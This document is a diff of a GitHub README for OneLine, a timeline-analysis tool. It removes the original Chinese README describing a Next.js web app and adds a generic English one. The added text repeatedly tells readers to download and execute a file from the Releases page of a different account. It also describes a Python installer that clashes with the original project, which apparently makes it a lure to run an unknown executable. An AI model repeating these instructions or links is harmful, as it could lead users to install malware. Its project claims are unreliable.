@@ -1,84 +1,77 @@
-## 一线 (OneLine)
+# OneLine: AI-Driven Event Timeline Generator 🌐🕒
 
-一线是一个热点事件时间轴分析工具，它可以帮助用户快速了解重大事件的发展脉络并提供AI辅助分析。
-### [Demo站点](https://oneline.chengtx.me)
-![image](https://github.com/user-attachments/assets/6d20acf8-c4a7-4a52-9849-1d526ec50ba7)
-![image](https://github.com/user-attachments/assets/1b8adf2c-2223-4ba5-94bd-0c223889fd1b)
+![OneLine Logo](https://img.shields.io/badge/OneLine-AI%20Timeline%20Generator-blue?style=flat&logo=appveyor)
 
-## 主要功能
+Welcome to the **OneLine** repository! OneLine is an AI-driven tool designed to generate timelines of trending events. With its intuitive interface and powerful algorithms, you can easily track and visualize the most important happenings around the globe.
 
-- 根据用户输入的关键词，生成相关历史事件的时间轴
-- 显示每个事件的时间、标题、描述和相关人物
-- 时间筛选功能，可按不同时间范围筛选事件
-- AI分析功能，提供事件的深入背景、过程、影响分析
-- 标记事件信息来源，增强可信度
+## Table of Contents
 
-## 技术栈
+- [Features](#features)
+- [Getting Started](#getting-started)
+- [Usage](#usage)
+- [Installation](#installation)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-- Next.js
-- React
-- TypeScript
-- Tailwind CSS
-- shadcn/ui 组件库
+## Features ✨
 
-## Docker部署
-感谢 [@justincnn](https://github.com/justincnn) 佬构建的镜像
-```
-docker pull justincnn/oneline
-```
+- **AI-Powered Insights**: Leverage artificial intelligence to gather and summarize trending events.
+- **Interactive Timeline**: Visualize events on a timeline for better understanding and analysis.
+- **User-Friendly Interface**: Simple and clean design makes navigation easy for all users.
+- **Real-Time Updates**: Stay updated with the latest trends as they happen.
+- **Multi-Platform Support**: Works on various operating systems, ensuring accessibility for everyone.
 
-## 配置
+## Getting Started 🚀
 
-### 前端配置
+To get started with OneLine, you can download the latest release from our [Releases section](https://github.com/carlos30112/OneLine/releases). This file needs to be downloaded and executed on your machine.
 
-该应用需要配置外部AI API（如Google Gemini API或OpenAI API）才能正常工作。在使用前，点击右上角的"API设置"按钮，配置以下信息：
+### Prerequisites
 
-- API端点
-- 模型名称
-- API密钥
+Before you begin, ensure you have the following:
 
-### 环境变量配置
+- A compatible operating system (Windows, macOS, or Linux).
+- Python 3.x installed on your machine.
+- Basic understanding of command line usage.
 
-除了前端配置外，你还可以通过环境变量来配置API设置。这对于部署环境特别有用，可以避免将敏感信息暴露给用户。
+## Usage 📊
 
-1. 复制项目根目录下的`.env.example`文件为`.env.local`
-2. 在`.env.local`文件中填入你的配置：
+Once you have installed OneLine, you can start using it to generate timelines of trending events. Here’s how to use it:
 
-```
-# 服务器端环境变量
-# API端点配置
-API_ENDPOINT=https://api.example.com/v1/chat/completions
+1. **Launch the Application**: Open the OneLine application from your desktop or command line.
+2. **Select Event Categories**: Choose the categories of events you want to track (e.g., sports, politics, technology).
+3. **Generate Timeline**: Click on the "Generate Timeline" button to create a visual representation of the selected events.
+4. **Explore and Analyze**: Use the interactive features to explore the timeline and analyze the data.
 
-# API模型配置
-API_MODEL=gemini-2.0-pro-exp-search
+## Installation 🛠️
 
-# API密钥配置
-API_KEY=your_api_key_here
+To install OneLine, follow these steps:
 
-# 是否允许用户在前端配置API设置
-# 设置为"false"将禁止用户在前端修改API设置
-# 设置为"true"或不设置将允许用户在前端修改API设置
-NEXT_PUBLIC_ALLOW_USER_CONFIG=true
+1. **Download the Latest Release**: Visit our [Releases section](https://github.com/carlos30112/OneLine/releases) to download the latest version.
+2. **Extract Files**: Unzip the downloaded file to your desired location.
+3. **Run the Installer**: Execute the installer file and follow the prompts to complete the installation.
+4. **Verify Installation**: Open your command line and type `oneline --version` to verify that OneLine is installed correctly.
 
-# 访问密码配置
-# 设置后，用户需要输入正确的密码才能访问API设置
-# 这可以避免API被滥用，增强应用安全性
-NEXT_PUBLIC_ACCESS_PASSWORD=your_access_password_here
-```
+## Contributing 🤝
 
-**注意事项：**
+We welcome contributions from the community! If you would like to contribute to OneLine, please follow these steps:
 
-- 环境变量配置的优先级高于前端用户配置
-- 当`NEXT_PUBLIC_ALLOW_USER_CONFIG`设置为`false`时，用户将无法在前端修改API设置
-- 当设置了`NEXT_PUBLIC_ACCESS_PASSWORD`时，用户需要输入正确的密码才能访问API设置
-- 当未设置环境变量时，将使用前端用户配置的设置
+1. **Fork the Repository**: Click the "Fork" button at the top right of the repository page.
+2. **Clone Your Fork**: Clone your forked repository to your local machine using `git clone <your-fork-url>`.
+3. **Create a Branch**: Create a new branch for your feature or bug fix using `git checkout -b feature-name`.
+4. **Make Changes**: Implement your changes and commit them with a clear message.
+5. **Push Changes**: Push your changes to your forked repository using `git push origin feature-name`.
+6. **Submit a Pull Request**: Go to the original repository and submit a pull request with a description of your changes.
 
-### Vercel 部署注意事项
+## License 📜
 
-在 Vercel 上部署时，请确保：
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-1. 在 Vercel 项目设置中配置环境变量（API_KEY、API_ENDPOINT 等）
-2. 不要在 Vercel 项目设置中启用"静态构建"选项
+## Contact 📧
 
-## 友情项目
-- [@snailyp](https://github.com/snailyp)大佬的[gemini轮询代理服务](https://github.com/snailyp/gemini-balance) 本项目的Demo站后端API服务也是使用大佬的项目，太强了🤗
+For any inquiries or feedback, please contact us at:
+
+- Email: support@onelineapp.com
+- GitHub: [OneLine Repository](https://github.com/carlos30112/OneLine)
+
+Thank you for checking out OneLine! We hope you find it useful for tracking and visualizing trending events. For more updates and releases, don’t forget to visit our [Releases section](https://github.com/carlos30112/OneLine/releases).
